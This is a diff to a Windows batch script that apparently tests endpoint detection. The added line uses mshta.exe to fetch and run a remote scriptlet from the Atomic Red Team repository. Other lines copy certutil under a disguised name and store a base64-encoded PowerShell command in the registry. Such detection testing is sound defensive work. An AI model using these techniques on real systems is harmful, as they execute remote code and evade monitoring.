@@ -1,6 +1,8 @@
 @echo on
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
+mshta.exe javascript:a=(GetObject('script:#{https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct}')).Exec();close();
+
 start /wait reg.exe add "HKEY_CURRENT_USER\Software\Classes\XSample" /v XXX /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2Nucm1hcmsudHh0IiAtdmFsdWUgInRhcmdldCI="
 
 start %temp%\EDRtestFile.exe
